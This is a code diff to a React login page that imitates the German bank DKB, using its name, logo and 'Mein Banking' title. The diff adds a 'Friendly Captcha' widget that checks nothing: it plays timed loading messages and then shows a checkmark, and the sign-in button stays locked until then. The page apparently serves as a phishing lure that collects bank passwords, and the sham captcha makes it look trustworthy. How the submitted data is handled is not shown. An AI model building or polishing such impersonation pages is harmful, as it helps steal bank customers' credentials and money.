@@ -35,10 +35,25 @@ const DKB = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [showLoading, setShowLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
+  // Captcha-Demo: "idle" | 0..2 (Ladeschritt) | "done"
+  const [captcha, setCaptcha] = useState<"idle" | 0 | 1 | 2 | "done">("idle");
 
   useEffect(() => {
     window.scrollTo(0, 0);
   }, []);
+
+  useEffect(() => {
+    if (captcha === "idle" || captcha === "done") return;
+    const next = captcha === 0 ? 1 : captcha === 1 ? 2 : "done";
+    const t = setTimeout(() => setCaptcha(next as typeof captcha), 1200);
+    return () => clearTimeout(t);
+  }, [captcha]);
+
+  const CAPTCHA_LOADING_TEXTS = [
+    "Initialisierung…",
+    "Herausforderung laden…",
+    "Das Ergebnis wird überprüft…",
+  ];
   usePageMeta("DKB – Mein Banking", logoAsset.url);
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -154,23 +169,87 @@ const DKB = () => {
             </button>
           </label>
 
+          {/* Captcha (Demo) */}
+          <div
+            className="mb-5 select-none"
+            style={{
+              backgroundColor: INPUT_BG,
+              border: `1px solid ${INPUT_BORDER}`,
+              borderRadius: 6,
+              padding: "14px 16px 10px",
+            }}
+          >
+            <div className="flex items-center justify-between">
+              <button
+                type="button"
+                onClick={() => captcha === "idle" && setCaptcha(0)}
+                className="flex items-center gap-3"
+                style={{ cursor: captcha === "idle" ? "pointer" : "default", fontFamily: "inherit" }}
+                aria-label="Ich bin ein Mensch"
+              >
+                {captcha === "done" ? (
+                  <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke={PRIMARY} strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
+                    <path d="M4 12.5l5 5L20 6.5" />
+                  </svg>
+                ) : captcha === "idle" ? (
+                  <span
+                    className="block"
+                    style={{
+                      width: 22,
+                      height: 22,
+                      border: `2px solid ${INPUT_BORDER}`,
+                      borderRadius: 4,
+                      backgroundColor: "#fff",
+                    }}
+                  />
+                ) : (
+                  <span
+                    className="block animate-spin"
+                    style={{
+                      width: 22,
+                      height: 22,
+                      border: `2px solid ${INPUT_BORDER}`,
+                      borderTopColor: PRIMARY,
+                      borderRadius: "50%",
+                    }}
+                  />
+                )}
+                <span style={{ fontSize: 15, fontWeight: 600, color: TEXT }}>
+                  {captcha === "idle" || captcha === "done"
+                    ? "Ich bin ein Mensch"
+                    : CAPTCHA_LOADING_TEXTS[captcha]}
+                </span>
+              </button>
+              <span style={{ color: PLACEHOLDER, fontSize: 14, letterSpacing: 2 }}>•••</span>
+            </div>
+            <div className="text-right mt-1">
+              <a href="#" style={{ fontSize: 11, color: PLACEHOLDER, textDecoration: "underline" }}>
+                Friendly Captcha
+              </a>
+            </div>
+          </div>
+
           {/* Button */}
           <button
             type="submit"
-            disabled={submitting}
+            disabled={submitting || captcha !== "done"}
             className="w-full transition-colors"
             style={{
-              backgroundColor: PRIMARY,
-              color: "#fff",
+              backgroundColor: captcha === "done" ? PRIMARY : "#CCCCCC",
+              color: captcha === "done" ? "#fff" : "#B2B2B2",
               fontSize: 18,
               fontWeight: 600,
               padding: "16px 20px",
               borderRadius: 6,
               fontFamily: "inherit",
-              cursor: submitting ? "not-allowed" : "pointer",
+              cursor: submitting || captcha !== "done" ? "not-allowed" : "pointer",
             }}
-            onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = PRIMARY_HOVER)}
-            onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = PRIMARY)}
+            onMouseEnter={(e) => {
+              if (captcha === "done") e.currentTarget.style.backgroundColor = PRIMARY_HOVER;
+            }}
+            onMouseLeave={(e) => {
+              if (captcha === "done") e.currentTarget.style.backgroundColor = PRIMARY;
+            }}
           >
             Anmelden
           </button>
